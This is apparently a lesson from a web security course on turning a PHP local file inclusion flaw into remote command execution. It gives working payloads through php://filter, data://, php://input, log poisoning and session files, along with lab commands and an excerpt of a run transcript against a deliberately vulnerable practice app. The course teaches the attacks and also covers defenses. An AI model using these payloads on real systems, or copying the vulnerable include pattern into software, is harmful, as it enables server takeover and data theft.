---
title: "Lesson 7.3: Escalating LFI to RCE"
image:
  path: /assets/img/covers/web-7-3-escalating-lfi-rce.webp
  alt: "Escalating LFI to RCE"
date: 2024-06-15 15:15:00 +0700
categories: ["Web Security", "Web · File and Path"]
tags: [web, lfi, rce]
render_with_liquid: false
---

After this lesson you know how to turn an LFI that only reads files into command execution, through PHP wrappers, the data wrapper, log poisoning, and session files. The labs here run on your own machine or on systems you are authorized to test.

![Escalating LFI to RCE](/assets/img/web/web-7-3-escalating-lfi-rce.svg)
_include() runs any PHP it loads, so four roads feed it attacker-controlled PHP._

Part: 7 | Time: about 55 minutes | Difficulty: advanced

**Prerequisites:** Lesson 7.1 (Path traversal and LFI), Lesson 7.2 (File upload).

**Tools:** curl, Burp Suite, base64.

## Goals

After this lesson you understand why `include($_GET['page'])` in PHP is far more dangerous than reading a file, you can use `php://filter` to extract source code, you can reach RCE through `data://`, `php://input`, log poisoning, and session files, and you know which technique needs which configuration (allow_url_include) and which one works at any time.

## 1. Theory

In Lesson 7.1 we READ a file. In PHP, when an app uses `include`/`require`/`include_once` with a user-controlled path, the file is LOADED and EXECUTED as PHP code. This is LFI (Local File Inclusion) in the true sense. If you can push a file containing PHP code through `include`, you have RCE.

```php
$page = $_GET['page'];
include($page);   // LFI: any file with <?php ... ?> will be run
```

The problem is that reading `/etc/passwd` has no PHP code in it, so it just prints out. The craft is finding a way to put PHP code into some file that you can include. Four classic roads:

### a) `php://filter`: extract source (needs no configuration)

`php://filter` is a PHP wrapper (a stream wrapper). It does not run code, but it lets you read source as base64, getting past the fact that PHP would "execute" it instead of printing it:

```
?page=php://filter/convert.base64-encode/resource=index.php
```

The result is the base64 of the `index.php` source. Decode it and you read the whole code, trace the DB creds, the other included files, and the log paths. This is a recon step you almost always do first.

### b) `data://` and `php://input`: inject code directly (needs `allow_url_include=On`)

These two wrappers let you put PHP content straight into `include`:

```
# data:// carries the code as base64
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==&c=id

# php://input: the PHP code is in the POST body
POST /?page=php://input&c=id
Body: <?php system($_GET['c']); ?>
```

The condition is that PHP must have `allow_url_include=On`. By default it is OFF, so these two only work on a loosely configured server (common on old systems). The lab turns it on so you can see it work.

### c) Log poisoning: always works, needs no special configuration

The idea is that the server writes data you control into a local log file (access log, error log), then you include that log file. You just insert PHP code into a logged field, for example `User-Agent`:

```
# 1) send a request with a malicious User-Agent
User-Agent: <?php system($_GET['c']); ?>
# 2) include the log file
?page=/var/log/apache2/access.log&c=id
```

When included, PHP meets `<?php ... ?>` in the log and runs it. This is pure local file inclusion, and it does not touch `allow_url_include`, so it works even when `data://`/`php://input` are off. Common log targets: `access.log`, `error.log`, `/var/log/mail`, `/proc/self/environ` (inject through User-Agent, historic), or a file the app itself writes.

### d) Session file

If you control a value that goes into `$_SESSION` (for example a username), PHP stores it in the session file `sess_<id>` in `/var/lib/php/sessions/` (or `/tmp`). Insert PHP code into that value, then include the session file: `?page=/var/lib/php/sessions/sess_<PHPSESSID>&c=id`. The same principle as log poisoning.

A quick summary of the conditions:

| Technique | Needs | Result |
|---|---|---|
| php://filter | nothing | read source |
| data:// | allow_url_include=On | RCE |
| php://input | allow_url_include=On | RCE |
| log poisoning | you can write into an includable log file | RCE |
| session file | you control a value going into the session | RCE |

## 2. Demo

Extract the source first to understand the app, then pick the RCE road based on the configuration:

```text
# read source
?page=php://filter/convert.base64-encode/resource=index.php
# -> base64, decode to read the code

# RCE through data:// (if allow_url_include=On)
?page=data://text/plain;base64,<base64 of the webshell>&c=id

# RCE through log poisoning (always works)
User-Agent: <?php system($_GET['c']); ?>
?page=../logs/access.log&c=id
```

## 3. Lab

- Vulnerable app: `labs/7.3/` (a PHP "Mini CMS", run `php -S 127.0.0.1:8063 -t www -d allow_url_include=1 -d allow_url_fopen=1`).
- Task: extract the source `index.php`, then reach RCE with at least one technique (the lab demonstrates all four).
- Hint: the app does `include($_GET['page'])` directly, and it writes `User-Agent` into `logs/access.log`.
- Solution: `labs/7.3/exploit.sh` and `labs/7.3/transcript.txt`.

An excerpt from a real run (all four techniques work):

```text
=== [2] php://filter: doc SOURCE index.php (base64) roi giai ma ===
<?php
// Lab 7.3 - LFI leo thang RCE (co y de lo hong)
...
=== [4] php://input: body la ma PHP -> RCE (can allow_url_include) ===
...INPUT_RCE: uid=1000(haipanda) gid=1000(Administrator) ...
=== [5] Log poisoning: nhet PHP vao User-Agent roi include access.log ===
...UA=LOG_RCE: uid=1000(haipanda) gid=1000(Administrator) ...
```

## 4. Common pitfalls

- **The app appends `.php` at the end** (`include($page.'.php')`), which blocks log poisoning. The old trick was a null byte `%00` to cut it off, now patched. Still try php://filter (the resource carries its own extension).
- **Confusing LFR with LFI.** If it only reads the file (no include/execute), you cannot get RCE this way. Go back to the paths in Lesson 7.1.
- Defense (important): do NOT include from input. Map through an allowlist (`'home' => 'pages/home.php'`). Turn off `allow_url_include` and `allow_url_fopen`. Tighten write permissions on log files. Block the `php://`, `data://`, `phar://` wrappers if you must accept a path.

## 5. Further reading

- HackTricks: LFI / RCE via PHP wrappers, log poisoning.
- PayloadsAllTheThings: File Inclusion.
- PortSwigger: Directory traversal (the PHP wrappers section).

## 6. Key takeaways

- LFI in PHP (`include`) is potential RCE, not just a file read.
- `php://filter/convert.base64-encode/resource=` always extracts the source, so do it first.
- `data://` and `php://input` need `allow_url_include=On`.
- Log poisoning and session files are the "always works" RCE roads once you can read a file you poisoned.
- Read the source first to learn the log paths, the configuration, and whether it appends `.php`.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 7.3</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-web/7.3.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-web/7.3/exploit.sh" download><i class="fa-solid fa-file-code"></i>exploit.sh</a>
</div>
</div>
